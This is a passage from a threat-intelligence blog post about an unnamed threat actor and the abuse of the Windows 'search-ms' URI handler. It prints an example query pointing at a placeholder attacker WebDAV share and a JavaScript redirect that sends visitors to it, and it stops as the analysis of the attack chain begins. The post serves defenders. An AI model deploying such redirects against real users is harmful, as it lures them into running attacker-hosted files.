18.697v77.828h40.797v-1.746l-.215-.053c-6.94-1.631-9.18-4.606-9.18-12.239V75.066a42 42 0 0 0-.578-7.26c1.947-4.661 5.86-10.177 13.475-10.177 9.214 0 13.691 6.114 13.691 18.696v77.828z"></path></svg></a><div class="ax h"><div class="ab ay az ba bb q bc bd"><div class="bm" aria-hidden="false" aria-describedby="searchResults" aria-labelledby="searchResults"></div><div class="bn bo ab"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="none" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M4.092 11.06a6.95 6.95 0 1 1 13.9 0 6.95 6.95 0 0 1-13.9 0m6.95-8.05a8.05 8.05 0 1 0 5.13 14.26l3.75 3.75a.56.56 0 1 0 .79-.79l-3.73-3.73A8.05 8.05 0 0 0 11.042 3z" clip-rule="evenodd"></path></svg></div><input role="combobox" aria-controls="searchResults" aria-expanded="false" aria-label="search" data-testid="headerSearchInput" tabindex="0" class="ay be bf bg z bh bi bj bk bl" placeholder="Search" value=""/></div></div></div><div class="h k w fg fh"><div class="fi ab"><span><a class="af ag ah ai aj ak al am an ao ap aq ar as at" data-testid="headerWriteButton" href="https://medium.com/m/signin?operation=register&amp;redirect=https%3A%2F%2Fmedium.com%2Fnew-story&amp;source=---top_nav_layout_nav-----------------------new_post_topnav-----------" rel="noopener follow"><div class="bf b bg z du fj fk ab q fl fm"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="none" viewBox="0 0 24 24" aria-label="Write"><path fill="currentColor" d="M14 4a.5.5 0 0 0 0-1zm7 6a.5.5 0 0 0-1 0zm-7-7H4v1h10zM3 4v16h1V4zm1 17h16v-1H4zm17-1V10h-1v10zm-1 1a1 1 0 0 0 1-1h-1zM3 20a1 1 0 0 0 1 1v-1zM4 3a1 1 0 0 0-1 1h1z"></path><path stroke="currentColor" d="m17.5 4.5-8.458 8.458a.25.25 0 0 0-.06.098l-.824 2.47a.25.25 0 0 0 .316.316l2.47-.823a.25.25 0 0 0 .098-.06L19.5 6.5m-2-2 2.323-2.323a.25.25 0 0 1 .354 0l1.646 1.646a.25.25 0 0 1 0 .354L19.5 6.5m-2-2 2 2"></path></svg><div class="dt l">Write</div></div></a></span></div></div><div class="k j i d"><div class="fi ab"><a class="af ag ah ai aj ak al am an ao ap aq ar as at" data-testid="headerSearchButton" href="https://medium.com/search?source=---top_nav_layout_nav----------------------------------" rel="noopener follow"><div class="bf b bg z du fj fk ab q fl fm"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="none" viewBox="0 0 24 24" aria-label="Search"><path fill="currentColor" fill-rule="evenodd" d="M4.092 11.06a6.95 6.95 0 1 1 13.9 0 6.95 6.95 0 0 1-13.9 0m6.95-8.05a8.05 8.05 0 1 0 5.13 14.26l3.75 3.75a.56.56 0 1 0 .79-.79l-3.73-3.73A8.05 8.05 0 0 0 11.042 3z" clip-rule="evenodd"></path></svg></div></a></div></div><div class="fi h k j"><div class="ab q"><p class="bf b dx dy dz ea eb ec ed ee ef eg du"><span><button class="bf b dx dy eh dz ea ei eb ec ej ek ee el em eg eo ep eq er es et eu ev ew ex ey ez fa fb fc fd bm fe ff" data-testid="headerSignUpButton">Sign up</button></span></p><div class="ax l"><p class="bf b dx dy dz ea eb ec ed ee ef eg du"><span><a class="af ag ah ai aj ak al am an ao ap aq ar as at" data-testid="headerSignInButton" href="https://medium.com/m/signin?operation=login&amp;redirect=https%3A%2F%2Fgi7w0rm.medium.com%2Funcovering-ddgroup-a-long-time-threat-actor-d3b3020625a4&amp;source=post_page---top_nav_layout_nav-----------------------global_nav-----------" rel="noopener follow">Sign in</a></span></p></div></div></div><div class="l" aria-hidden="false"><button class="ay fn am ab q ao fo fp fq" aria-label="user options menu" data-testid="headerUserIcon"><div class="l fj"><img alt="" class="l fd by bz ca cx" src="https://miro.medium.com/v2/resize:fill:64:64/1*dmbNkD5D-u45r44go_cf0g.png" width="32" height="32" loading="lazy" role="presentation"/><div class="fr by l bz ca fs n ay ft"></div></div></button></div></div></div><div class="l"><div class="fu fv fw fx fy l"><div class="ab cb"><div class="ci bh fz ga gb gc"></div></div><article><div class="l"><div class="l"><span class="l"></span><section><div><div class="fs gi gj gk gl gm"></div><div class="gn go gp gq gr"><div class="ab cb"><div class="ci bh fz ga gb gc"><div><h1 id="f9c5" class="pw-post-title gs gt gu bf gv gw gx gy gz ha hb hc hd he hf hg hh hi hj hk hl hm hn ho hp hq hr hs ht hu bk" data-testid="storyTitle">Uncovering DDGroup — A long-time threat actor</h1><div><div class="speechify-ignore ab cp"><div class="speechify-ignore bh l"><div class="hv hw hx hy hz ab"><div><div class="ab ia"><div><div class="bm" aria-hidden="false"><a rel="noopener follow" href="/?source=post_page---byline--d3b3020625a4--------------------------------"><div class="l ib ic by id ie"><div class="l fj"><img alt="Gi7w0rm" class="l fd by dd de cx" src="https://miro.medium.com/v2/resize:fill:88:88/1*XNZYIunppMSwHbb0Dxx3cA.png" width="44" height="44" loading="lazy" data-testid="authorPhoto"/><div class="if by l dd de fs n ig ft"></div></div></div></a></div></div></div></div><div class="bn bh l"><div class="ab"><div style="flex:1"><span class="bf b bg z bk"><div class="ih ab q"><div class="ab q ii"><div class="ab q"><div><div class="bm" aria-hidden="false"><p class="bf b ij ik bk"><a class="af ag ah ai aj ak al am an ao ap aq ar il" data-testid="authorName" rel="noopener follow" href="/?source=post_page---byline--d3b3020625a4--------------------------------">Gi7w0rm</a></p></div></div></div><span class="im in" aria-hidden="true"><span class="bf b bg z du">·</span></span><p class="bf b ij ik du"><span><a class="io ip ah ai aj ak al am an ao ap aq ar ex iq ir" href="https://medium.com/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2F_%2Fsubscribe%2Fuser%2Ffa7639fc99f0&amp;operation=register&amp;redirect=https%3A%2F%2Fgi7w0rm.medium.com%2Funcovering-ddgroup-a-long-time-threat-actor-d3b3020625a4&amp;user=Gi7w0rm&amp;userId=fa7639fc99f0&amp;source=post_page-fa7639fc99f0--byline--d3b3020625a4---------------------post_header-----------" rel="noopener follow">Follow</a></span></p></div></div></span></div></div><div class="l is"><span class="bf b bg z du"><div class="ab cn it iu iv"><span class="bf b bg z du"><div class="ab ae"><span data-testid="storyReadTime">16 min read</span><div class="iw ix l" aria-hidden="true"><span class="l" aria-hidden="true"><span class="bf b bg z du">·</span></span></div><span data-testid="storyPublishDate">Sep 8, 2023</span></div></span></div></span></div></div></div><div class="ab cp iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn"><div class="h k w fg fh q"><div class="kd l"><div class="ab q ke kf"><div class="pw-multi-vote-icon fj kg kh ki kj"><span><a class="af ag ah ai aj ak al am an ao ap aq ar as at" data-testid="headerClapButton" href="https://medium.com/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2F_%2Fvote%2Fp%2Fd3b3020625a4&amp;operation=register&amp;redirect=https%3A%2F%2Fgi7w0rm.medium.com%2Funcovering-ddgroup-a-long-time-threat-actor-d3b3020625a4&amp;user=Gi7w0rm&amp;userId=fa7639fc99f0&amp;source=---header_actions--d3b3020625a4---------------------clap_footer-----------" rel="noopener follow"><div><div class="bm" aria-hidden="false"><div class="kk ao kl km kn ko am kp kq kr kj"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" aria-label="clap"><path fill-rule="evenodd" d="M11.37.828 12 3.282l.63-2.454zM13.916 3.953l1.523-2.112-1.184-.39zM8.589 1.84l1.522 2.112-.337-2.501zM18.523 18.92c-.86.86-1.75 1.246-2.62 1.33a6 6 0 0 0 .407-.372c2.388-2.389 2.86-4.951 1.399-7.623l-.912-1.603-.79-1.672c-.26-.56-.194-.98.203-1.288a.7.7 0 0 1 .546-.132c.283.046.546.231.728.5l2.363 4.157c.976 1.624 1.141 4.237-1.324 6.702m-10.999-.438L3.37 14.328a.828.828 0 0 1 .585-1.408.83.83 0 0 1 .585.242l2.158 2.157a.365.365 0 0 0 .516-.516l-2.157-2.158-1.449-1.449a.826.826 0 0 1 1.167-1.17l3.438 3.44a.363.363 0 0 0 .516 0 .364.364 0 0 0 0-.516L5.293 9.513l-.97-.97a.826.826 0 0 1 0-1.166.84.84 0 0 1 1.167 0l.97.968 3.437 3.436a.36.36 0 0 0 .517 0 .366.366 0 0 0 0-.516L6.977 7.83a.82.82 0 0 1-.241-.584.82.82 0 0 1 .824-.826c.219 0 .43.087.584.242l5.787 5.787a.366.366 0 0 0 .587-.415l-1.117-2.363c-.26-.56-.194-.98.204-1.289a.7.7 0 0 1 .546-.132c.283.046.545.232.727.501l2.193 3.86c1.302 2.38.883 4.59-1.277 6.75-1.156 1.156-2.602 1.627-4.19 1.367-1.418-.236-2.866-1.033-4.079-2.246M10.75 5.971l2.12 2.12c-.41.502-.465 1.17-.128 1.89l.22.465-3.523-3.523a.8.8 0 0 1-.097-.368c0-.22.086-.428.241-.584a.847.847 0 0 1 1.167 0m7.355 1.705c-.31-.461-.746-.758-1.23-.837a1.44 1.44 0 0 0-1.11.275c-.312.24-.505.543-.59.881a1.74 1.74 0 0 0-.906-.465 1.47 1.47 0 0 0-.82.106l-2.182-2.182a1.56 1.56 0 0 0-2.2 0 1.54 1.54 0 0 0-.396.701 1.56 1.56 0 0 0-2.21-.01 1.55 1.55 0 0 0-.416.753c-.624-.624-1.649-.624-2.237-.037a1.557 1.557 0 0 0 0 2.2c-.239.1-.501.238-.715.453a1.56 1.56 0 0 0 0 2.2l.516.515a1.556 1.556 0 0 0-.753 2.615L7.01 19c1.32 1.319 2.909 2.189 4.475 2.449q.482.08.971.08c.85 0 1.653-.198 2.393-.579.231.033.46.054.686.054 1.266 0 2.457-.52 3.505-1.567 2.763-2.763 2.552-5.734 1.439-7.586z" clip-rule="evenodd"></path></svg></div></div></div></a></span></div><div class="pw-multi-vote-count l ks kt ku kv kw kx ky"><p class="bf b dv z du"><span class="kz">--</span></p></div></div></div><div><div class="bm" aria-hidden="false"><button class="ao kk la lb ab q fk lc ld" aria-label="responses"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" class="le"><path d="M18.006 16.803c1.533-1.456 2.234-3.325 2.234-5.321C20.24 7.357 16.709 4 12.191 4S4 7.357 4 11.482c0 4.126 3.674 7.482 8.191 7.482.817 0 1.622-.111 2.393-.327.231.2.48.391.744.559 1.06.693 2.203 1.044 3.399 1.044.224-.008.4-.112.486-.287a.49.49 0 0 0-.042-.518c-.495-.67-.845-1.364-1.04-2.057a4 4 0 0 1-.125-.598zm-3.122 1.055-.067-.223-.315.096a8 8 0 0 1-2.311.338c-4.023 0-7.292-2.955-7.292-6.587 0-3.633 3.269-6.588 7.292-6.588 4.014 0 7.112 2.958 7.112 6.593 0 1.794-.608 3.469-2.027 4.72l-.195.168v.255c0 .056 0 .151.016.295.025.231.081.478.154.733.154.558.398 1.117.722 1.659a5.3 5.3 0 0 1-2.165-.845c-.276-.176-.714-.383-.941-.59z"></path></svg></button></div></div></div><div class="ab q jo jp jq jr js jt ju jv jw jx jy jz ka kb kc"><div class="lf k j i d"></div><div class="h k"><div><div class="bm" aria-hidden="false"><span><a class="af ag ah ai aj ak al am an ao ap aq ar as at" data-testid="headerBookmarkButton" href="https://medium.com/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2F_%2Fbookmark%2Fp%2Fd3b3020625a4&amp;operation=register&amp;redirect=https%3A%2F%2Fgi7w0rm.medium.com%2Funcovering-ddgroup-a-long-time-threat-actor-d3b3020625a4&amp;source=---header_actions--d3b3020625a4---------------------bookmark_footer-----------" rel="noopener follow"><svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" fill="none" viewBox="0 0 25 25" class="du lg" aria-label="Add to list bookmark button"><path fill="currentColor" d="M18 2.5a.5.5 0 0 1 1 0V5h2.5a.5.5 0 0 1 0 1H19v2.5a.5.5 0 1 1-1 0V6h-2.5a.5.5 0 0 1 0-1H18zM7 7a1 1 0 0 1 1-1h3.5a.5.5 0 0 0 0-1H8a2 2 0 0 0-2 2v14a.5.5 0 0 0 .805.396L12.5 17l5.695 4.396A.5.5 0 0 0 19 21v-8.5a.5.5 0 0 0-1 0v7.485l-5.195-4.012a.5.5 0 0 0-.61 0L7 19.985z"></path></svg></a></span></div></div></div><div class="fd lh cn"><div class="l ae"><div class="ab cb"><div class="li lj lk ll lm ln ci bh"><div class="ab"><div class="bm bh" aria-hidden="false"><div><div class="bm" aria-hidden="false"><button aria-label="Listen" data-testid="audioPlayButton" class="af fk ah ai aj ak al lo an ao ap ex lp lq ld lr ls lt lu lv s lw lx ly lz ma mb mc u md me mf"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="none" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M3 12a9 9 0 1 1 18 0 9 9 0 0 1-18 0m9-10C6.477 2 2 6.477 2 12s4.477 10 10 10 10-4.477 10-10S17.523 2 12 2m3.376 10.416-4.599 3.066a.5.5 0 0 1-.777-.416V8.934a.5.5 0 0 1 .777-.416l4.599 3.066a.5.5 0 0 1 0 .832" clip-rule="evenodd"></path></svg><div class="j i d"><p class="bf b bg z du">Listen</p></div></button></div></div></div></div></div></div></div></div><div class="bm" aria-hidden="false" aria-describedby="postFooterSocialMenu" aria-labelledby="postFooterSocialMenu"><div><div class="bm" aria-hidden="false"><button aria-controls="postFooterSocialMenu" aria-expanded="false" aria-label="Share Post" data-testid="headerSocialShareButton" class="af fk ah ai aj ak al lo an ao ap ex lp lq ld lr ls lt lu lv s lw lx ly lz ma mb mc u md me mf"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="none" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M15.218 4.931a.4.4 0 0 1-.118.132l.012.006a.45.45 0 0 1-.292.074.5.5 0 0 1-.3-.13l-2.02-2.02v7.07c0 .28-.23.5-.5.5s-.5-.22-.5-.5v-7.04l-2 2a.45.45 0 0 1-.57.04h-.02a.4.4 0 0 1-.16-.3.4.4 0 0 1 .1-.32l2.8-2.8a.5.5 0 0 1 .7 0l2.8 2.79a.42.42 0 0 1 .068.498m-.106.138.008.004v-.01zM16 7.063h1.5a2 2 0 0 1 2 2v10a2 2 0 0 1-2 2h-11c-1.1 0-2-.9-2-2v-10a2 2 0 0 1 2-2H8a.5.5 0 0 1 .35.15.5.5 0 0 1 .15.35.5.5 0 0 1-.15.35.5.5 0 0 1-.35.15H6.4c-.5 0-.9.4-.9.9v10.2a.9.9 0 0 0 .9.9h11.2c.5 0 .9-.4.9-.9v-10.2c0-.5-.4-.9-.9-.9H16a.5.5 0 0 1 0-1" clip-rule="evenodd"></path></svg><div class="j i d"><p class="bf b bg z du">Share</p></div></button></div></div></div></div></div></div></div></div></div><p id="684d" class="pw-post-body-paragraph mg mh gu mi b mj mk ml mm mn mo mp mq mr ms mt mu mv mw mx my mz na nb nc nd gn bk">Sometimes when investigating malware, you come across something that calls your attention. Something that seems odd, something that seems noteworthy, or something that just sticks with you. This blog post is the result of just that. But let&#x27;s start from the beginning…</p></div></div></div><div class="ab cb ne nf ng nh" role="separator"><span class="ni by bm nj nk nl"></span><span class="ni by bm nj nk nl"></span><span class="ni by bm nj nk"></span></div><div class="gn go gp gq gr"><div class="ab cb"><div class="ci bh fz ga gb gc"><h2 id="3007" class="nm nn gu bf no np nq dy nr ns nt ea nu mr nv nw nx mv ny nz oa mz ob oc od oe bk">Summary:</h2><p id="35e8" class="pw-post-body-paragraph mg mh gu mi b mj of ml mm mn og mp mq mr oh mt mu mv oi mx my mz oj nb nc nd gn bk">In the following blog post, we are going to have a look at a new attacker group I discovered by sheer coincidence. I will start off by describing a new attack vector described by Trellix Security, which abuses the “search-ms” URI handler to trick victims into opening a malicious file. From there, I will describe the encounter of an in-the-wild attack, which unexpectedly led me to the discovery of tons of indicators related to a Threat Actor that has been mentioned in several articles since February 2022, but has never been named or specifically described. I was able to track back their activity to at least the beginning of 2019, but I do believe the activity goes far beyond that. I am going to introduce their lures, some of the campaigns they have done so far, and some specific characteristics they show. Buckle up, it is probably going to be a long and interesting read. ^^</p></div></div></div><div class="ab cb ne nf ng nh" role="separator"><span class="ni by bm nj nk nl"></span><span class="ni by bm nj nk nl"></span><span class="ni by bm nj nk"></span></div><div class="gn go gp gq gr"><div class="ab cb"><div class="ci bh fz ga gb gc"><h2 id="a6b6" class="nm nn gu bf no np nq dy nr ns nt ea nu mr nv nw nx mv ny nz oa mz ob oc od oe bk">Chapter 1: The “search-ms” URI handler abuse</h2><p id="65ae" class="pw-post-body-paragraph mg mh gu mi b mj of ml mm mn og mp mq mr oh mt mu mv oi mx my mz oj nb nc nd gn bk">On August 7, 2023, researchers at security company Trellix released a <a class="af ok" href="https://www.trellix.com/en-us/about/newsroom/stories/research/beyond-file-search-a-novel-method.html" rel="noopener ugc nofollow" target="_blank">post</a> about a new kind of attack vector, targeting Windows Users via the “search-ms” protocol. While the theory behind this attack vector is not new, Trellix had observed it in several in-the-wild attacks, bundled with some new methods to compromise users.</p><p id="7bd4" class="pw-post-body-paragraph mg mh gu mi b mj mk ml mm mn mo mp mq mr ms mt mu mv mw mx my mz na nb nc nd gn bk">“<a class="af ok" href="https://learn.microsoft.com/en-us/windows/win32/search/getting-started-with-parameter-value-arguments" rel="noopener ugc nofollow" target="_blank">search-ms</a>” is a URI handler implemented in Microsoft Windows. If my research is correct it has been introduced in Windows XP and has been present and expanded on ever since. To understand how this protocol works, here is a sample query as taken from an actual attack:</p><pre class="ol om on oo op oq or os bp ot bb bk"><span id="e48a" class="ou nn gu or b bg ov ow l ox oy">search-ms:query=Invoice_4532&amp;crumb=location:\\\\[AttackerIP]@5000\\DavWWWRoot&amp;displayname=Search&#x27;</span></pre><p id="536a" class="pw-post-body-paragraph mg mh gu mi b mj mk ml mm mn mo mp mq mr ms mt mu mv mw mx my mz na nb nc nd gn bk">This query has several parts. Let&#x27;s look at them individually to better grasp what is going on:</p><ol class=""><li id="91c3" class="mg mh gu mi b mj mk ml mm mn mo mp mq mr ms mt mu mv mw mx my mz na nb nc nd oz pa pb bk"><strong class="mi gv">search-ms : </strong>This is the URI handler in question. Similar to “http:” or “ldap” it defines the protocol used to handle a specific URI. In this case the rest of the string defines a query to be handled by Windows Search.</li><li id="9e07" class="mg mh gu mi b mj pc ml mm mn pd mp mq mr pe mt mu mv pf mx my mz pg nb nc nd oz pa pb bk"><strong class="mi gv">query=Invoice_4532 : </strong>This part defines what should be searched for. In this case we will search the location given in the next argument for the term “Invoice_4532”.</li><li id="31bc" class="mg mh gu mi b mj pc ml mm mn pd mp mq mr pe mt mu mv pf mx my mz pg nb nc nd oz pa pb bk"><strong class="mi gv">crumb=location: : </strong>This feature is implemented since Windows Vista and supports AQL statements. It is used to narrow the scope of where a query should be searched.</li><li id="71b0" class="mg mh gu mi b mj pc ml mm mn pd mp mq mr pe mt mu mv pf mx my mz pg nb nc nd oz pa pb bk"><strong class="mi gv">location:\\\\[AttackerIP]@5000\\DavWWWRoot :</strong> This is the location we want to search. It is actually where the main magic happens because, besides locations that are on your local device, this parameter actually allows you to search remote locations as well. However, if everything works as intended, there is no actual warning that the user is querying a remote drive. An inexperienced user might not even notice it at all. Note that the part behind the “@” symbol is actually the port and path used.</li><li id="f3e6" class="mg mh gu mi b mj pc ml mm mn pd mp mq mr pe mt mu mv pf mx my mz pg nb nc nd oz pa pb bk"><strong class="mi gv">displayname=Search : </strong>This argument defines the name shown in the explorer window for the particular query.</li></ol><p id="8993" class="pw-post-body-paragraph mg mh gu mi b mj mk ml mm mn mo mp mq mr ms mt mu mv mw mx my mz na nb nc nd gn bk">Trellix observed that the above-described URI handler was abused in a set of attacks where an attacker would make a victim (unknowingly) open a search URL that queried an attacker-controlled server. Initiated through either a direct phishing link sent to the victim or through a malicious attachment, the victim would be redirected to search for a specific file name (aligning with the lure) on an attacker-controlled server. In most cases this was done by having the victim open a webpage, which had the following javascript redirect included:</p><pre class="ol om on oo op oq or os bp ot bb bk"><span id="814d" class="ou nn gu or b bg ov ow l ox oy">&lt;script&gt;<br/>window.location.href = &#x27;search-ms:query=[Filename]&amp;crumb=location:\\\\[Attacker_IP]\\DavWWWRoot&amp;displayname=[Displayname]&#x27;;<br/>&lt;/script&gt;<br/></span></pre><p id="17c1" class="pw-post-body-paragraph mg mh gu mi b mj mk ml mm mn mo mp mq mr ms mt mu mv mw mx my mz na nb nc nd gn bk">Upon opening this page, the victim would be prompted to open the page with the adequate application (Windows Explorer), as seen in the image below:</p><figure class="ol om on oo op pk ph pi paragraph-image"><div role="button" tabindex="0" class="pl pm fj pn bh po"><div class="ph pi pj"><picture><source srcSet="https://miro.medium.com/v2/resize:fit:640/format:webp/1*M7Ll2pMy4J_SOed9OrCC8Q.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*M7Ll2pMy4J_SOed9OrCC8Q.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*M7Ll2pMy4J_SOed9OrCC8Q.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*M7Ll2pMy4J_SOed9OrCC8Q.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*M7Ll2pMy4J_SOed9OrCC8Q.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*M7Ll2pMy4J_SOed9OrCC8Q.png 1100w, https://miro.medium.com/v2/resize:fit:1400/format:webp/1*M7Ll2pMy4J_SOed9OrCC8Q.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px" type="image/webp"/><source data-testid="og" srcSet="https://miro.medium.com/v2/resize:fit:640/1*M7Ll2pMy4J_SOed9OrCC8Q.png 640w, https://miro.medium.com/v2/resize:fit:720/1*M7Ll2pMy4J_SOed9OrCC8Q.png 720w, https://miro.medium.com/v2/resize:fit:750/1*M7Ll2pMy4J_SOed9OrCC8Q.png 750w, https://miro.medium.com/v2/resize:fit:786/1*M7Ll2pMy4J_SOed9OrCC8Q.png 786w, https://miro.medium.com/v2/resize:fit:828/1*M7Ll2pMy4J_SOed9OrCC8Q.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*M7Ll2pMy4J_SOed9OrCC8Q.png 1100w, https://miro.medium.com/v2/resize:fit:1400/1*M7Ll2pMy4J_SOed9OrCC8Q.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px"/><img alt="" class="bh ln pp c" width="700" height="180" loading="lazy" role="presentation"/></picture></div></div><figcaption class="pq ff pr ph pi ps pt bf b bg z du">Figure 1: Redirect to Windows Explorer</figcaption></figure><p id="225e" class="pw-post-body-paragraph mg mh gu mi b mj mk ml mm mn mo mp mq mr ms mt mu mv mw mx my mz na nb nc nd gn bk">If permitted, the victim would be greeted by this:</p><figure class="ol om on oo op pk ph pi paragraph-image"><div role="button" tabindex="0" class="pl pm fj pn bh po"><div class="ph pi pu"><picture><source srcSet="https://miro.medium.com/v2/resize:fit:640/format:webp/1*NjzYuHM9aZfRBOnlKpRWPg.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*NjzYuHM9aZfRBOnlKpRWPg.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*NjzYuHM9aZfRBOnlKpRWPg.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*NjzYuHM9aZfRBOnlKpRWPg.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*NjzYuHM9aZfRBOnlKpRWPg.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*NjzYuHM9aZfRBOnlKpRWPg.png 1100w, https://miro.medium.com/v2/resize:fit:1400/format:webp/1*NjzYuHM9aZfRBOnlKpRWPg.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px" type="image/webp"/><source data-testid="og" srcSet="https://miro.medium.com/v2/resize:fit:640/1*NjzYuHM9aZfRBOnlKpRWPg.png 640w, https://miro.medium.com/v2/resize:fit:720/1*NjzYuHM9aZfRBOnlKpRWPg.png 720w, https://miro.medium.com/v2/resize:fit:750/1*NjzYuHM9aZfRBOnlKpRWPg.png 750w, https://miro.medium.com/v2/resize:fit:786/1*NjzYuHM9aZfRBOnlKpRWPg.png 786w, https://miro.medium.com/v2/resize:fit:828/1*NjzYuHM9aZfRBOnlKpRWPg.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*NjzYuHM9aZfRBOnlKpRWPg.png 1100w, https://miro.medium.com/v2/resize:fit:1400/1*NjzYuHM9aZfRBOnlKpRWPg.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px"/><img alt="" class="bh ln pp c" width="700" height="147" loading="lazy" role="presentation"/></picture></div></div><figcaption class="pq ff pr ph pi ps pt bf b bg z du">Figure 2: Query from attack</figcaption></figure><p id="49db" class="pw-post-body-paragraph mg mh gu mi b mj mk ml mm mn mo mp mq mr ms mt mu mv mw mx my mz na nb nc nd gn bk">As you can see, in this case, the particular attack campaign was already over and so the “invoice6688” file had been deleted. Still, you can observe the query executed in the top right search bar and also the name of the query given as “Search” in the middle top bar and on the very top in the tab name.</p><p id="c074" class="pw-post-body-paragraph mg mh gu mi b mj mk ml mm mn mo mp mq mr ms mt mu mv mw mx my mz na nb nc nd gn bk">In an attack scenario, there are obviously many file types you could put here to be executed by the victim. From .exe to .lnk, as long as the victim believes the file is on their device and they double-click it, the attack will be successful.</p><p id="7758" class="pw-post-body-paragraph mg mh gu mi b mj mk ml mm mn mo mp mq mr ms mt mu mv mw mx my mz na nb nc nd gn bk">Initially, I was really intrigued by this new technique. I was planning to write a blog on it and collected some additional information, including a PoC for my local environment. However, I stumbled upon a great <a class="af ok" href="https://micahbabinski.medium.com/search-ms-webdav-and-chill-99c5b23ac462" rel="noopener">medium post</a> by <a class="af ok" href="https://twitter.com/MicahBabinski" rel="noopener ugc nofollow" target="_blank">Micah Babinski</a> who thoroughly covered the topic and I just had nothing to add to it. So instead I had a closer look at the IoC given by Trellix and tried to find additional IoC that could be linked to this campaign. I found that some of the servers used in the attacks described by Trellix had actually been used for Microsoft Office Phishing prior to this new campaign. However, all links listed by Trellix were down and I only ended up at dead ends. I decided to stop my investigation and as a last thing I warned my colleagues and industry peers about this new vector, as ever since Microsoft blocked Macro-based documents, attackers are very fast to adapt to new attack vectors. So better be prepared to see this more often.</p></div></div></div><div class="ab cb ne nf ng nh" role="separator"><span class="ni by bm nj nk nl"></span><span class="ni by bm nj nk nl"></span><span class="ni by bm nj nk"></span></div><div class="gn go gp gq gr"><div class="ab cb"><div class="ci bh fz ga gb gc"><h2 id="4b5d" class="nm nn gu bf no np nq dy nr ns nt ea nu mr nv nw nx mv ny nz oa mz ob oc od oe bk">Chapter 2: An Unexpected Hit</h2><p id="a7aa" class="pw-post-body-paragraph mg mh gu mi b mj of ml mm mn og mp mq mr oh mt mu mv oi mx my mz oj nb nc nd gn bk">One of the key advantages you have, if you are active in the infosec space of social media, is the various contacts you make over time. Besides the fact that you can learn a lot from industry peers if communicating with sufficient people, there are always some interesting things knocking at your door when you least expect them. In the case of this blog post, the day after investigating this new attack vector, I received a message from my friend and industry peer <a class="af ok" href="https://twitter.com/tosscoinwitcher" rel="noopener ugc nofollow" target="_blank">Fate112</a>. Fate had recently observed an increased amount of phishing targeting one of the organizations he is responsible for. As I had noticed some phishing pages on the same servers that were used for the “search-ms” attacks, I had warned him the day before. He actually went on to scan his logs for characteristic patterns of the “search-ms” attack pattern and found a hit! In this case, the execution was prevented by the AV, but it gave me an in-the-wild case to analyze. Awesome! :D</p><p id="ba3a" class="pw-post-body-paragraph mg mh gu mi b mj mk ml mm mn mo mp mq mr ms mt mu mv mw mx my mz na nb nc nd gn bk">So, let’s dig into the attack chain:</p><figure class="ol om on oo op pk ph pi paragraph-image"><div role="button" tabindex="0" class="pl pm fj pn bh po"><div class="ph pi pv"><picture><source 